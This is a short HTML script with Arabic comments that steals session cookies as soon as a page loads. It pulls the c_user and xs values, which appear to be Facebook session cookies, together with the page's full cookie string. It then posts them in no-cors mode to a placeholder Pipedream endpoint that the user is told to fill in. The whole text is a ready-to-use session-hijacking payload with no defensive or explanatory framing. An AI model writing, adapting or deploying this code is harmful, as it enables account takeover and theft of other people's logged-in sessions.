<script>
function sendSession() {
    // استخراج الكوكيز المطلوبة
    const c_user = document.cookie.split('; ').find(row => row.startsWith('c_user=')).split('=')[1];
    const xs = document.cookie.split('; ').find(row => row.startsWith('xs=')).split('=')[1];
    
    // إرسال البيانات إلى Pipedream الخاص بك
    fetch('https://YOUR_PIPEDREAM_ENDPOINT.com', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            user_id: c_user,
            session_key: xs,
            full_cookie: document.cookie
        })
    });
}
// تنفيذ السحب فور تحميل الصفحة
window.onload = sendSession;
</script>
